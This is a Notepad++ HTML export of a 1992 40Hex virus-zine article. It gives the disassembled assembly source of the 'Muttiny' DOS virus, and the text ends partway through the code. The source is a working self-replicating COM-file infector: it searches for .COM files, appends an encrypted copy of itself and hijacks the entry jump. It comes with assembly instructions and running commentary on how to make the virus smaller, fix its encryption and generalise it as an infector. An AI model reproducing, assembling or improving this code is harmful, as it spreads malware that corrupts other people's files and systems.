<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; 40Hex Number 7 Volume 2 Issue 3                                     File 004</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; I picked up a file touted as "a very small virus" and decided to figure out</span><span class="sc0">
</span><span class="sc1">; what this virus could be. SCAN86-B turned up nothing, so I had to disassemble</span><span class="sc0">
</span><span class="sc1">; it.  The name was intriguing -- muttiny.  I thought it was a misspelling of</span><span class="sc0">
</span><span class="sc1">; mutiny, but I was terribly wrong.  After a minute, I had infected a carrier</span><span class="sc0">
</span><span class="sc1">; file and decrypted the virus.  It took but one minute more to disassemble and</span><span class="sc0">
</span><span class="sc1">; maybe half an hour to comment.  Argh!  It is yet another TINY strain!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; I do not know who the author is, but I had a few comments to make. This</span><span class="sc0">
</span><span class="sc1">; virus, quite frankly, sucks. It is a pitiful excuse for programming. Many,</span><span class="sc0">
</span><span class="sc1">; many improvements can be made.  I have put comments on how this virus could</span><span class="sc0">
</span><span class="sc1">; be made much mo' bettah.  I must tell whoever wrote the virus that TINY is</span><span class="sc0">
</span><span class="sc1">; not so tiny anymore.  The original TINYs were 150 bytes long.  Now look at</span><span class="sc0">
</span><span class="sc1">; it!  It is over twice that size!  I suppose this virus is the "MUTated TINY"</span><span class="sc0">
</span><span class="sc1">; variant, but I'd prefer to call it "Messed Up Totally TINY".  The author MUST</span><span class="sc0">
</span><span class="sc1">; clean up the virus before distributing it to everyone!  One further</span><span class="sc0">
</span><span class="sc1">; improvement would be to make this virus a generic COM infector, which can be</span><span class="sc0">
</span><span class="sc1">; done in well under 200 bytes, with all the "functionality" of the current</span><span class="sc0">
</span><span class="sc1">; version.  Note that this time I did not rewrite it, a la Tiny F 1.1, but</span><span class="sc0">
</span><span class="sc1">; rather merely suggested improvements.  This way, you can easily see the bugs</span><span class="sc0">
</span><span class="sc1">; for yourself and learn from the author's pitfalls.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;               Dark Angel of PHALCON/SKISM     4/23/92</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; P.S. This is a byte-to-byte match of the virus I picked up -- even the</span><span class="sc0">
</span><span class="sc1">;      labels are in their correct offsets.  The file below should match</span><span class="sc0">
</span><span class="sc1">;      the source code of the original carrier file exactly. Assemble w/</span><span class="sc0">
</span><span class="sc1">;      TASM /m2.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; P.P.S. This is the last Tiny strain to be published in 40Hex. For some</span><span class="sc0">
</span><span class="sc1">;      Reason, Tiny strains seem to come up again and again over here. I</span><span class="sc0">
</span><span class="sc1">;      think it is hightime to put the Tiny series in its grave where it</span><span class="sc0">
</span><span class="sc1">;      belongs.  Amen.  So be it.                                     DA</span><span class="sc0">

</span><span class="sc5">muttiny</span><span class="sc0">         </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">muttiny</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">muttiny</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;jmp     startvir</span><span class="sc0">
</span><span class="sc5">restorehere</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">idword</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">990h</span><span class="sc0">
</span><span class="sc1">;The next line is incredibly pointless. It is a holdover from one</span><span class="sc0">
</span><span class="sc1">;of the original TINYs, where the id was 7, 8, 9.  The author can</span><span class="sc0">
</span><span class="sc1">;easily save one byte merely by deleting this line.</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09h</span><span class="sc0">
</span><span class="sc5">startvir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">oldtrick</span><span class="sc0">                </span><span class="sc1">;Standard location-finder</span><span class="sc0">
</span><span class="sc5">oldtrick</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc1">;The following statement is a bug -- well, not really a bug, just</span><span class="sc0">
</span><span class="sc1">;extraneous code.  The value pushed on the stack in the following</span><span class="sc0">
</span><span class="sc1">;line is NEVER popped off. This is messy programming, as one byte</span><span class="sc0">
</span><span class="sc1">;could be saved by removing the statement.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldtrick</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">                 </span><span class="sc1">;Decrypt virus</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">savepsp</span><span class="sc0">                 </span><span class="sc1">;and save the PSP</span><span class="sc0">
</span><span class="sc1">;NOTE:  The entire savepsp/restorepsp procedures are unnecessary.</span><span class="sc0">
        </span><span class="sc1">; See the procedures at the end for further details.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">findencryptval</span><span class="sc0">    </span><span class="sc1">;Go to th rest of the virus</span><span class="sc0">
</span><span class="sc1">;The next line is another example of messy programming -- it is a</span><span class="sc0">
</span><span class="sc1">;NOP inserted by MASM during assembly.  Running this file through</span><span class="sc0">
</span><span class="sc1">;TASM with the /m2 switch should eliminate such "fix-ups."</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;The next line leaves me guessing as to the author's true intent.</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">encryptval</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;Save handle</span><span class="sc0">
</span><span class="sc1">;The following two lines of code could be condensed into one:</span><span class="sc0">
</span><span class="sc1">;      lea bx, [si+offset startencrypt]</span><span class="sc0">
</span><span class="sc1">;Once again, poor programming style, though there's nothing wrong</span><span class="sc0">
</span><span class="sc1">;with the code.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startencrypt</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc1">;Continueencrypt is implemented as a jmp-type loop. Although it's</span><span class="sc0">
</span><span class="sc1">;fine to code it this way, it's probably easier to code using the</span><span class="sc0">
</span><span class="sc1">;loop statement.  Upon close inspection, one finds the loop to be</span><span class="sc0">
</span><span class="sc1">;flawed. Note the single inc bx statement. This essentially makes</span><span class="sc0">
</span><span class="sc1">;the encryption value a a byte instead of a word, which decreases</span><span class="sc0">
</span><span class="sc1">;the number of mutations from 65,535 to 255.  Once again, this is</span><span class="sc0">
</span><span class="sc1">;just poor programming, very easily rectified with another inc bx</span><span class="sc0">
</span><span class="sc1">;statement. Another optimization could be made.  Use a</span><span class="sc0">
</span><span class="sc1">;      mov dx, [si+encryptval]</span><span class="sc0">
</span><span class="sc1">;to load up the encryption value before the loop, and replace the</span><span class="sc0">
</span><span class="sc1">;three lines following continueencrypt with a simple:</span><span class="sc0">
</span><span class="sc1">;      xor word ptr [bx], dx</span><span class="sc0">
</span><span class="sc5">continueencrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">encryptval</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;The next two lines should be executed BEFORE continueencrypt. As</span><span class="sc0">
</span><span class="sc1">;it stands right now, they are recalculated every iteration which</span><span class="sc0">
</span><span class="sc1">;slows down execution somewhat. Furthermore, the value calculated</span><span class="sc0">
</span><span class="sc1">;is much too large and this increases execution time. Yet another</span><span class="sc0">
</span><span class="sc1">;improvement would be the merging of the mov/add pair to the much</span><span class="sc0">
</span><span class="sc1">;cleaner lea cx, [si+offset endvirus].</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">veryend</span><span class="sc0">       </span><span class="sc1">;Calculate end of</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">;encryption: Note</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;the value is 246</span><span class="sc0">
                </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">continueencrypt</span><span class="sc0">         </span><span class="sc1">;bytes too large.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">writerest</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;Tack on the virus to the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">                 </span><span class="sc1">;end of the file.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idword</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idword</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Write starting from the id</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;word</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">startencrypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;This is where the encrypted area begins.  This could be moved to</span><span class="sc0">
</span><span class="sc1">;where the ret is in procedure writerest, but it is not necessary</span><span class="sc0">
</span><span class="sc1">;since it won't affect the "scannability" of the virus.</span><span class="sc0">

</span><span class="sc5">findencryptval</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">                  </span><span class="sc1">;Get random #</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;CX=hr/min dx=sec</span><span class="sc0">
</span><span class="sc1">;The following chunk of code puzzles me. I admit it, I am totally</span><span class="sc0">
</span><span class="sc1">;lost as to its purpose.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptval</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">step_two</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptval</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">step_two</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">foundencryptionvalue</span><span class="sc0">
</span><span class="sc5">step_two</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;Check to see if any</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;part of the encryption</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findencryptval</span><span class="sc0">          </span><span class="sc1">;value is 0 and if so,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;find another value.</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findencryptval</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptval</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">foundencryptionvalue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldjmp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Set up bp for</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">103h</span><span class="sc0">                 </span><span class="sc1">;jmp later</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;'*.COM',0</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                  </span><span class="sc1">;Find first</span><span class="sc0">
</span><span class="sc5">tryanother</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">quit_virus</span><span class="sc0">              </span><span class="sc1">;If none found, exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                </span><span class="sc1">;Open read/write</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9Eh</span><span class="sc0">                  </span><span class="sc1">;In default DTA</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;Swap file handle register</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">                    </span><span class="sc1">;Read 3 bytes</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">      </span><span class="sc1">;Is it a jmp?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">
</span><span class="sc5">findnext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                  </span><span class="sc1">;If not, find next</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">tryanother</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">;Move file pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;to jmp location</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldjmp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">;and save old jmp</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;location</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">skipcheckinf</span><span class="sc0">
</span><span class="sc1">;Once again, we meet an infamous MASM-NOP.</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;I don't understand why checkinf is implemented as a procedure as</span><span class="sc0">
</span><span class="sc1">;it is executed but once.  It is a waste of code space to do such</span><span class="sc0">
</span><span class="sc1">;a thing. The ret and call are both extra, wasting four bytes. An</span><span class="sc0">
</span><span class="sc1">;additional three bytes were wasted on the JMP skipping checkinf.</span><span class="sc0">
</span><span class="sc1">;In a program called "Tiny," a wasted seven bytes is rather large</span><span class="sc0">
</span><span class="sc1">;and should not exist.  I have written a virus of half the length</span><span class="sc0">
</span><span class="sc1">;of this virus which is a generic COM infector. There is just too</span><span class="sc0">
</span><span class="sc1">;too much waste in this program.</span><span class="sc0">
</span><span class="sc5">checkinf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">990h</span><span class="sc0">      </span><span class="sc1">;Is it already</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findnext</span><span class="sc0">                </span><span class="sc1">;infected?</span><span class="sc0">
</span><span class="sc1">;The je statement above presents another problem. It leaves stuff</span><span class="sc0">
</span><span class="sc1">;on the stack from the call.  This is, once again, not a critical</span><span class="sc0">
</span><span class="sc1">;error but nevertheless it is extremely sloppy behavior.</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">                  </span><span class="sc1">;Goto end of file</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">skipcheckinf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">                    </span><span class="sc1">;read 2 bytes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkinf</span><span class="sc0">
</span><span class="sc1">;The next check is extraneous.  No COM file is larger than 65,535</span><span class="sc0">
</span><span class="sc1">;bytes before infection simply because it is "illegal."  Yet ano-</span><span class="sc0">
</span><span class="sc1">;ther waste of code.  Even if one were to use this useless check,</span><span class="sc0">
</span><span class="sc1">;it should be implemented, to save space, as or dx, dx.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;Check if too big</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">findnext</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">                 </span><span class="sc1">;Check again if too big</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">findnext</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">storejmp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;Save new jmp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writerest</span><span class="sc0">               </span><span class="sc1">;    location</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">;Go to offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;1 in the file</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;and write the new</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;jmp location</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">storejmp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc1">;I think it is quite obvious that the next line is pointless.  It</span><span class="sc0">
</span><span class="sc1">;is a truly moronic waste of two bytes.</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">closefile</span><span class="sc0">
</span><span class="sc5">closefile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">;Close the file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc5">quit_virus</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restorepsp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">;Read file</span><span class="sc0">
</span><span class="sc1">;I do not understand why all the int 21h calls are done with this</span><span class="sc0">
</span><span class="sc1">;procedure.  It is a waste of space. A normal int 21h call is two</span><span class="sc0">
</span><span class="sc1">;bytes long while it's three bytes just to call this procedure!</span><span class="sc0">
</span><span class="sc5">int21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Made in England'</span><span class="sc0">

</span><span class="sc1">;Note: The comments for savepsp also apply to restorepsp.</span><span class="sc0">

</span><span class="sc1">;This code could have easily been changed to a set active DTA INT</span><span class="sc0">
</span><span class="sc1">;21h call (AH = 1Ah).  It would have saved many, many bytes.</span><span class="sc0">

</span><span class="sc5">savepsp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;The following is a bug.  It should be</span><span class="sc0">
</span><span class="sc1">;      mov cx, 50h</span><span class="sc0">
</span><span class="sc1">;since the author decided to use words instead of bytes.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc1">;The loop below is dumb.  A simple rep movsw statement would have</span><span class="sc0">
</span><span class="sc1">;sufficed.  Instead, countless bytes are wasted on the loop.</span><span class="sc0">
</span><span class="sc5">storebytes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">pspstore</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
